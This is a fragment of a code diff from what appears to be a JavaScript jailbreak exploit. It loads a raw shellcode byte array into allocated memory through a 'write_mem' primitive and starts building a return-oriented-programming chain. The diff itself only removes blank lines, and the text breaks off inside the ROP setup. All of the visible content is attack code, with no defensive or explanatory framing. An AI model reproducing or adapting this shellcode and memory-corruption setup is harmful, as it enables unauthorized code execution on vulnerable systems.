@@ -2,9 +2,6 @@ var payload = [233,235,6,0,0,144,144,144,137,249,15,50,72,193,226,32,72,9,208,19
 
 window.mira_blob = malloc(49244);
 write_mem(window.mira_blob, payload);
-
-
-
 setTimeout(function(){
 try {
     var ropchain = malloc(619088);
